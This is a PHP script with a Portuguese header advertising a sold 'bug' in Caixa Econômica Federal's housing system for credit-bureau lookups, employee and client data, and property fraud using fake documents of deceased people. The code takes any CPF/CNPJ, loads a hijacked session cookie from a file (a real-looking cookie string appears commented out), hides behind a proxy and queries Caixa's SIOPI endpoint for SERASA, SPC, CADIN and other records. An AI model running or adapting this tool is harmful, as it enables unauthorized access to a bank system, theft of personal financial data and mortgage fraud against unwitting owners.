<?php

/*
#by puttyoe !#

- Bug caixa economica federal 2021 a 2025 = 500 mil 
- consulta dividas, spc, serasa, cadin, e internas
- dados gerentes + funcionarios + clientes + ocultos e socios.

- comprado da serasa e revendido a scpc/equifax por 300k em 2022.

- refinanciamento
- compra de imoveis sem entrada com cpf valido + docs falsos ( bug do ministerio publico com docs de pessoas falecidas)
- trava financiamento
- libera financiamento
- consulta passaport + rg + inss + cad unico, + pis/pasep.

vendido a grandes construtoras entre 2015 a 2025 ~ refinancimento em massa de predios e condominios sem os donos saberem, bug MP/ justiça br.
*/

$doc = $_REQUEST['doc'];
$proxy = 'ip:port';

$url = 'https://habitacao.caixa.gov.br/siopiweb-web/realizaPesquisaCadastralIndividual.do?method=renovarPesquisaCadastralAutomaticaIndividual&preencherVoltar=false';
//$cookie = 'JSESSIONID=xCCOXWpqsacX1I8KZhecWDs4MQ5BNirbCMw2GDIV.cadnpcldlx322; DWRSESSIONID=9JNbPp2ZwTA4HzYmYCK5Qoe6KKgka!gWxCp; __uzma=bd31243a-2470-43a7-bfba-b95b9fe8de71; __uzmb=1758762615; __uzme=4170; __uzmc=31166246194004; __uzmd=1759377788; NSC_MC_WT_10.121.64.35_TTM_443=ffffffff09719c7245525d5f4f58455e445a4a42378b';
$post = "method=exibirTelaPesquisaCadastralIndividualNova&cpfCnpj=".$doc."%401&nuFonteRecurso=8&nuGrupoFinanciamento=1&nuItemProduto=832501508&nuVersaoItemProduto=5&nuPapel=1&voltar=trataParticipante.do%3Fmethod%3DiniciarCasoDeUso%26nuProposta%3D0008.1987.0004537-7&nuProposta=0008.1987.0004537-7&noSistemaAutomatico=CADIN+++++++++++++++&noSistemaAutomatico=SERASA++++++++++++++&noSistemaAutomatico=SICCF+++++++++++++++&noSistemaAutomatico=SINAD+++++++++++++++&noSistemaAutomatico=SPC+++++++++++++++++";
$cookie = file_get_contents('cookie.txt');


$ch = curl_init();


$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Accept-Encoding: gzip, deflate, br, zstd';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://habitacao.caixa.gov.br';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://habitacao.caixa.gov.br/siopiweb-web/realizaPesquisaCadastralIndividual.do?method=confirmaRenovacaoPesquisaAutomatica';
$headers[] = 'Cookie": '.$cookie;
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: iframe';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'Priority: u=4';
$headers[] = 'Te: trailers';


curl_setopt_array($ch, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $post,
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_ENCODING => "gzip, deflate, br, zstd'", // gzip, br, etc.
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_VERBOSE => true,
    CURLOPT_HEADER => true,
]);

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_PROXY, $proxy);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);

echo $result;
